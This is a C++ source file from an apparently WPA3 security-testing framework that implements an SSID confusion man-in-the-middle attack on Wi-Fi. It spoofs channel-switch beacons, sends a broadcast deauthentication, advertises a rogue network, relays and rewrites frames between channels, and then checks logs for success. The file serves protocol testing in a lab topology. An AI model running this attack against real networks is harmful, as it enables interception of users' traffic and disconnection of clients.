#include "attacks/mc_mitm/ssid_confusion/ssid_confusion_attack.h"

#include <algorithm>
#include <atomic>
#include <pcap/pcap.h>
#include <thread>

#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include "attacks/components/setup_connections.h"
#include "attacks/mc_mitm/wifi_util.h"
#include "config/RunStatus.h"
#include "interrupt.h"
#include "logger/log.h"
#include "attacks/mc_mitm/MonitorSocket.h"
#include "observer/dmesg_wrapper.h"
#include "scan/active/scan_AP.h"
#include "system/utils.h"

using namespace std;
using namespace Tins;
using namespace chrono;

namespace wpa3_tester::ssid_confusion {

// Translate addr1/addr2/addr3 in a raw 802.11+RadioTap frame if they match 'from'.
static void translate_mac(vector<uint8_t>& raw, const HWAddress<6>& from, const HWAddress<6>& to) {
    if(raw.size() < 4) return;
    const uint16_t rt_len = static_cast<uint16_t>(raw[2]) | (static_cast<uint16_t>(raw[3]) << 8);
    for(const int off : {4, 10, 16}) {
        if(raw.size() < static_cast<size_t>(rt_len) + off + 6) break;
        if(equal(from.begin(), from.end(), raw.data() + rt_len + off))
            ranges::copy(to, raw.data() + rt_len + off);
    }
}

// Copy supplicant config + EAP user file (if present); start WrongNet AP + client.
void setup_attack(RunStatus &rs) {
    const auto cfg_dir = rs.config_path().parent_path() / "config";
    for(const auto &f : {"SafeNet_WrongNet.conf", "hostapd.eap_user"}) {
        const auto src = cfg_dir / f;
        if(exists(src)) copy_f(src, rs.run_folder() / f);
    }

    // mt76x2u delays assoc_resp TX_STATUS ~10s; hostapd can't start EAP until then,
    // but wpa_supplicant auth_timeout also fires at 10s — a deterministic race.
    // Fix: send probe requests from rogue_client so the AP calls send_frame_cmd for
    // probe responses, which flushes the pending TX_STATUS within ~500ms of association.
    const auto rogue_client       = rs.get_actor("rogue_client");
    rogue_client->set_iface_up();
    const Channel flush_ch        = rogue_client->get_channel();
    const HWAddress<6> rc_mac(rogue_client.get(SK::permanent_mac));
    const uint8_t ds_ch           = static_cast<uint8_t>(flush_ch.ch_num);

    /*atomic<bool> stop_flush{false};
    thread flush_thread([&] {
        MonitorSocket sock(rogue_client.get(SK::iface), rogue_client[SK::netns]);
        while (!stop_flush.load()) {
            Dot11ProbeRequest probe(HWAddress<6>::broadcast, rc_mac);
            probe.addr3(HWAddress<6>::broadcast);
            probe.ssid("");
            probe.add_option({ Dot11ManagementFrame::DS_SET, 1, &ds_ch });
            sock.send(probe, flush_ch);
            this_thread::sleep_for(milliseconds(500));
        }
    });*/

    //try {
        components::client_ap_setup_t(rs);
    /*} catch (...) {
        stop_flush = true;
        flush_thread.join();
        throw;
    }
    stop_flush = true;
    flush_thread.join();*/
}

// Topology: WrongNet AP (ch 11) <-> rogue_client (ch 11) <-> rogue_ap (ch 1, fake SafeNet) <-> client
void run_attack(RunStatus &rs) {
    const auto rogue_ap     = rs.get_actor("rogue_ap");     // injects confused beacons, relays client
    const auto rogue_client = rs.get_actor("rogue_client"); // CSA injection, relays to wrong AP
    const auto ap           = rs.get_actor("ap");           // WrongNet AP
    const auto client       = rs.get_actor("client");

    const auto &att_cfg        = rs.config().at("attack_config");
    const string real_ssid     = ap.get(SK::ssid);          // "WrongNet"
    const string confused_ssid = att_cfg.value("confused_ssid", real_ssid);
    const int    timeout_sec   = att_cfg.value("attack_time_sec", 150);
    const int    beacon_ms     = att_cfg.value("beacon_interval_ms", 100);
    const int    beacon_warn_s = att_cfg.value("beacon_warning_sec", 2);
    const bool   only_to_mitm  = att_cfg.value("only_to_mitm", false);

    rogue_ap->set_iface_up();
    rogue_client->set_iface_up();
    const Channel real_channel  = rogue_client->get_channel();
    const Channel rogue_channel = rogue_ap->get_channel();

    const HWAddress<6> ap_bssid(ap.get(SK::permanent_mac));
    const HWAddress<6> rogue_ap_mac(rogue_ap.get(SK::permanent_mac));
    const HWAddress<6> client_perm(client.get(SK::permanent_mac));

    // Scan for WrongNet beacon on ch 11 — template for CSA + confused beacon
    auto beacon = scan::RSN_scan(
        rogue_client.get(SK::iface), 20,
        ap.get(SK::permanent_mac), nullopt, rogue_client[SK::netns]);
    if(!beacon) throw run_err("'{}' AP not found on ch {}", real_ssid, real_channel.ch_num);
    log(LogLevel::INFO, "Found '{}' AP {} on ch {}", real_ssid, ap.get(SK::mac), real_channel.ch_num);

    // Build confused beacon: rogue_ap_mac BSSID + SafeNet SSID, ch IEs patched to rogue channel.
    // Using rogue_ap_mac avoids wpa_supplicant's 10s ignore-list that fires after CSA disconnect.
    auto confused_beacon = make_confused_beacon(*beacon, confused_ssid, false);
    confused_beacon.addr2(rogue_ap_mac);
    confused_beacon.addr3(rogue_ap_mac);
    if(auto *ch_ie = confused_beacon.search_option(Dot11ManagementFrame::DS_SET))
        const_cast<uint8_t *>(ch_ie->data_ptr())[0] = rogue_channel.ch_num;
    if(auto *ht_ie = confused_beacon.search_option(Dot11ManagementFrame::HT_OPERATION)) {
        if(ht_ie->data_size() >= 1)
            const_cast<uint8_t *>(ht_ie->data_ptr())[0] = rogue_channel.ch_num;
    }

    // BPF: AP + client traffic only
    const string bpf = "(wlan type data or mgt) and (wlan host " + ap.get(SK::permanent_mac) +
        " or wlan host " + client.get(SK::permanent_mac) + ")";
    MonitorSocket sock_real(rogue_client.get(SK::iface), rogue_client[SK::netns]);
    MonitorSocket sock_rogue(rogue_ap.get(SK::iface),    rogue_ap[SK::netns]);
    sock_real.set_filter(bpf);
    sock_rogue.set_filter(bpf);

    rs.start_observers(ObserverRunPolicy::SKIP);
    rs.process_manager.write_log_all(ATTACK_START_tag);

    // Initial CSA burst: spoof WrongNet MAC, push client ch 11 → ch 1
    for(int pass = 0; pass < 3; ++pass) {
        for(int cnt = CSA_attack::CHANNEL_SWITCH_MAX; cnt >= 0; --cnt) {
            RadioTap csa = CSA_attack::get_CSA_beacon(
                ap.get(SK::mac), real_channel, rogue_channel, cnt, beacon.get());
            sock_real.send(csa, real_channel);
            interruptible_sleep(milliseconds(beacon_ms));
        }
    }
    // Broadcast deauth so client re-scans
    Dot11Deauthentication deauth(HWAddress<6>::broadcast, HWAddress<6>(ap_bssid));
    deauth.addr3(HWAddress(ap_bssid));
    deauth.reason_code(3);
    sock_real.send(deauth, real_channel);

    const auto start      = steady_clock::now();
    auto next_beacon      = steady_clock::now();
    auto last_real_beacon = steady_clock::now();
    bool got_mitm = false;
    int  csa_count = CSA_attack::CHANNEL_SWITCH_MAX;

    while(true) {
        if(steady_clock::now() > start + seconds(timeout_sec)) {
            log(LogLevel::INFO, "Attack timeout");
            break;
        }
        if(only_to_mitm && got_mitm) break;

        const int fd_real  = pcap_get_selectable_fd(sock_real.get_pcap_handle());
        const int fd_rogue = pcap_get_selectable_fd(sock_rogue.get_pcap_handle());
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(fd_real, &fds);
        FD_SET(fd_rogue, &fds);
        const auto us_to_beacon = duration_cast<microseconds>(next_beacon - steady_clock::now()).count();
        timeval tv{ 0, (max<long>(0, min<long>(us_to_beacon, 100'000))) };
        select(max(fd_real, fd_rogue) + 1, &fds, nullptr, nullptr, &tv);

        // ch 11: frames from WrongNet AP → relay to client on ch 1 (translate BSSID)
        if(FD_ISSET(fd_real, &fds)) {
            while(auto r = sock_real.recv()) {
                const auto *dot11 = r.pdu->find_pdu<Dot11>();
                if(!dot11) continue;
                if(dot11->find_pdu<Dot11Beacon>()) {
                    last_real_beacon = steady_clock::now();
                    continue; // don't relay real AP beacons
                }
                const auto [addr1, addr2] = get_addrs(*r.pdu, r.raw);
                if(addr2 == ap_bssid) {
                    auto translated = r.raw;
                    translate_mac(translated, ap_bssid, rogue_ap_mac);
                    sock_rogue.send(translated, rogue_channel);
                }
            }
        }

        // ch 1: frames from confused client → relay to WrongNet on ch 11 (translate BSSID back)
        if(FD_ISSET(fd_rogue, &fds)) {
            while(auto r = sock_rogue.recv()) {
                const auto *dot11 = r.pdu->find_pdu<Dot11>();
                if(!dot11) continue;
                const auto [addr1, addr2] = get_addrs(*r.pdu, r.raw);

                // Answer probe requests so the client reliably finds SafeNet in active scan
                if(dot11->find_pdu<Dot11ProbeRequest>()) {
                    Dot11ProbeResponse resp(addr2, rogue_ap_mac);
                    resp.addr3(rogue_ap_mac);
                    resp.timestamp(confused_beacon.timestamp());
                    resp.interval(confused_beacon.interval());
                    resp.capabilities() = confused_beacon.capabilities();
                    for(const auto &opt : confused_beacon.options())
                        resp.add_option(opt);
                    sock_rogue.send(resp, rogue_channel);
                    continue;
                }

                if(addr2 != client_perm) continue;

                // GotMitm: EAPOL M4 or any DATA frame from our client
                const bool eapol4 = is_eapol(*r.pdu) && get_eapol_msg_num(*r.pdu) == 4;
                const bool data   = dot11->type() == Dot11::DATA;
                if((eapol4 || data) && !got_mitm) {
                    log(LogLevel::INFO, "GotMitm: {} connected on ch {} SSID='{}'",
                        addr2, rogue_channel.ch_num, confused_ssid);
                    got_mitm = true;
                }

                // Fix SSID in assoc-req and translate BSSID before relaying to real AP
                if(const auto *assoc = r.pdu->find_pdu<Dot11AssocRequest>()) {
                    auto fixed = make_real_ssid_assoc_req(*assoc, real_ssid);
                    fixed.addr1(ap_bssid);
                    fixed.addr3(ap_bssid);
                    sock_real.send(fixed, real_channel);
                } else {
                    auto translated = r.raw;
                    translate_mac(translated, rogue_ap_mac, ap_bssid);
                    sock_real.send(translated, real_channel);
                }
            }
        }

        if(next_beacon <= steady_clock::now()) {
            sock_rogue.send(confused_beacon, rogue_channel);

            if(!got_mitm) {
                RadioTap csa = CSA_attack::get_CSA_beacon(
                    ap.get(SK::mac), real_channel, rogue_channel, csa_count, beacon.get());
                sock_real.send(csa, real_channel);
                if(--csa_count < 0) csa_count = CSA_attack::CHANNEL_SWITCH_MAX;
            }
            next_beacon += milliseconds(beacon_ms);
        }

        if(last_real_beacon + seconds(beacon_warn_s) < steady_clock::now()) {
            log(LogLevel::WARNING, "No beacon from WrongNet AP for {}s", beacon_warn_s);
            last_real_beacon = steady_clock::now();
        }
    }

    rs.process_manager.write_log_all(ATTACK_STOP_tag);
}

// Check if client connected to confused_ssid (SafeNet) rather than WrongNet directly.
void stats_attack(const RunStatus &rs) {
    const auto logger_dir = rs.run_folder() / "logger";
    const auto &att_cfg   = rs.config().at("attack_config");
    const string confused_ssid = att_cfg.value("confused_ssid", string("SafeNet"));

    const auto client_log = logger_dir / "client.log";
    const auto try_assoc  = observer::dmesg::grep_log(client_log, "Trying to associate");
    const auto assoc_done = observer::dmesg::grep_log(client_log, "CTRL-EVENT-CONNECTED");

    if(!try_assoc.empty()) {
        log(LogLevel::INFO, "stats: client association attempts:");
        for(const auto &l: try_assoc) log(LogLevel::INFO, "  {}", l);
    }
    for(const auto &l: assoc_done) log(LogLevel::INFO, "stats: client connected: {}", l);

    // Success: client tried to associate with confused_ssid AND completed a connection.
    // CTRL-EVENT-CONNECTED shows BSSID not SSID, so check "Trying to associate" for the SSID.
    const bool confused_conn = !assoc_done.empty() &&
        ranges::any_of(try_assoc, [&](const string &l) {
            return l.find(confused_ssid) != string::npos;
        });

    const auto rogue_log  = logger_dir / "rogue_ap_cap.log";
    const auto eapol_done = observer::dmesg::grep_log(rogue_log, "EAPOL");
    if(!eapol_done.empty()) {
        log(LogLevel::INFO, "stats: EAPOL frames on rogue channel:");
        for(const auto &l: eapol_done) log(LogLevel::INFO, "  {}", l);
    }

    log(LogLevel::INFO, "stats: SSID confusion {}",
        confused_conn ? "SUCCEEDED (client associated with confused SSID)"
                      : "FAILED (client did not connect via confused SSID)");
}

}
